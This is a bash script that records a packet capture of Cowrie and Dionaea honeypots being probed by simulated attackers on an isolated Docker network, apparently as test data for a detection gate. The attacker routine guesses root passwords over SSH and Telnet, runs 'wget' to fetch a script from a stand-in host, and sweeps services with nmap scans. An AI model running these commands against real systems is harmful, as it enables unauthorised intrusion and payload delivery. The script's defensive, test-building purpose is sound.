#!/usr/bin/env bash
# Records a capture of the stock Cowrie and Dionaea honeypots being probed, for the honeypot-role
# gate (docs/architecture/investigation-framework.rst, phase 4). No public pcap of either exists:
# honeypot datasets publish the honeypots' own logs, not packets. This makes one anyone can rebuild
# from the official images, pinned by digest.
#
# Everything runs on an internal Docker network (no route out), in the documentation range
# 198.51.100.0/24 so the attackers read as internet hosts. Several attacker containers, each its own
# address, log in to Cowrie over SSH and Telnet and sweep Dionaea's services, as scanners do.
#
#   scripts/honeypot-capture.sh [out.pcap]        default: honeypot-gate.pcap
set -euo pipefail

OUT="${1:-honeypot-gate.pcap}"
COWRIE=cowrie/cowrie@sha256:115ed9b682dce64a112d6185dcd64c94969599e5b63f13c3e85927a9b2f0292f
DIONAEA=dinotools/dionaea@sha256:6f06d0a6035c865cb60ef51bd96ff3b1f25ee4bfcd852dad3f551bc2d93464ca
TOOLS=nicolaka/netshoot@sha256:7c6d613e96cbd29bc74f2d1d35035eeb2ec5e7b1cfbbc3277bd697bc3db7b40a
NET=tp-honeypot-gate
COWRIE_IP=198.51.100.22
DIONAEA_IP=198.51.100.45
ATTACKERS=(198.51.100.101 198.51.100.102 198.51.100.103 198.51.100.104 198.51.100.105 198.51.100.106)

cleanup() {
  docker rm -f tp-hp-cowrie tp-hp-dionaea tp-hp-dump >/dev/null 2>&1 || true
  for ip in "${ATTACKERS[@]}"; do docker rm -f "tp-hp-${ip##*.}" >/dev/null 2>&1 || true; done
  docker network rm "$NET" >/dev/null 2>&1 || true
}
trap cleanup EXIT
cleanup

docker network create --internal --subnet 198.51.100.0/24 "$NET" >/dev/null
# Telnet is off in Cowrie's stock config; turning it on is the only change from the defaults.
docker run -d --name tp-hp-cowrie --network "$NET" --ip "$COWRIE_IP" \
  -e COWRIE_TELNET_ENABLED=yes "$COWRIE" >/dev/null
docker run -d --name tp-hp-dionaea --network "$NET" --ip "$DIONAEA_IP" "$DIONAEA" >/dev/null

# One tcpdump sees the whole bridge: it joins the network as a host of its own, in promiscuous mode
# on a bridge every container shares, so it records both honeypots' traffic.
BRIDGE="br-$(docker network inspect -f '{{.Id}}' "$NET" | cut -c1-12)"
docker run -d --name tp-hp-dump --network host --cap-add NET_ADMIN --cap-add NET_RAW \
  -v "$PWD":/out "$TOOLS" tcpdump -i "$BRIDGE" -U -s 0 -w "/out/$(basename "$OUT")" >/dev/null

echo "Waiting for the honeypots to listen..."
for _ in $(seq 1 60); do
  if docker run --rm --network "$NET" --ip 198.51.100.99 "$TOOLS" sh -c \
      "nc -z -w1 $COWRIE_IP 2222 && nc -z -w1 $DIONAEA_IP 21" >/dev/null 2>&1; then break; fi
  sleep 2
done

# What each attacker does. Passwords differ per attacker: Cowrie accepts root with any but "root".
attack() {
  local ip=$1 n=$2
  docker run --rm --name "tp-hp-${ip##*.}" --network "$NET" --ip "$ip" "$TOOLS" sh -c "
    # SSH: banner grab, then a login that Cowrie accepts and a command or two.
    printf 'SSH-2.0-Go\r\n' | nc -w3 $COWRIE_IP 2222 >/dev/null 2>&1
    printf '#!/bin/sh\necho admin$n\n' > /tmp/pw && chmod +x /tmp/pw
    SSH_ASKPASS=/tmp/pw SSH_ASKPASS_REQUIRE=force setsid -w ssh -p 2222 -o StrictHostKeyChecking=no \
      -o UserKnownHostsFile=/dev/null -o ConnectTimeout=5 -o PreferredAuthentications=password \
      root@$COWRIE_IP 'uname -a; cat /proc/cpuinfo | head -3; wget http://203.0.113.7/x.sh' \
      </dev/null >/dev/null 2>&1 || true
    # Telnet: Cowrie's login prompt, a login, a command.
    (sleep 1; printf 'root\r\n'; sleep 1; printf 'pass$n\r\n'; sleep 1; printf 'id\r\n'; sleep 1) \
      | nc -w6 $COWRIE_IP 2223 >/dev/null 2>&1
    # Dionaea: an FTP login, a web page, SMB and MySQL hellos, and a sweep of the rest.
    (sleep 1; printf 'USER anonymous\r\n'; sleep 1; printf 'PASS x$n@\r\n'; sleep 1; printf 'QUIT\r\n') \
      | nc -w5 $DIONAEA_IP 21 >/dev/null 2>&1
    curl -s -m5 http://$DIONAEA_IP/ >/dev/null
    # TLS 1.2, so the certificate is in the clear (1.3 encrypts it).
    echo | openssl s_client -tls1_2 -connect $DIONAEA_IP:443 >/dev/null 2>&1
    nmap -Pn -n -p 445 --script smb-os-discovery,smb-protocols $DIONAEA_IP >/dev/null 2>&1
    nmap -Pn -n -p 1433 --script ms-sql-info $DIONAEA_IP >/dev/null 2>&1
    nmap -Pn -n -sT --max-retries 1 -p 21,42,69,80,135,443,445,1433,1723,1883,3306,5060,11211,27017 \
      $DIONAEA_IP >/dev/null 2>&1
    nmap -Pn -n -sV --version-light -p 21,80,445,1433,3306 $DIONAEA_IP >/dev/null 2>&1
  " || true
}

i=0
for ip in "${ATTACKERS[@]}"; do
  i=$((i + 1))
  echo "Attacker $ip"
  attack "$ip" "$i"
done

sleep 3
docker stop tp-hp-dump >/dev/null
echo "Wrote $OUT"
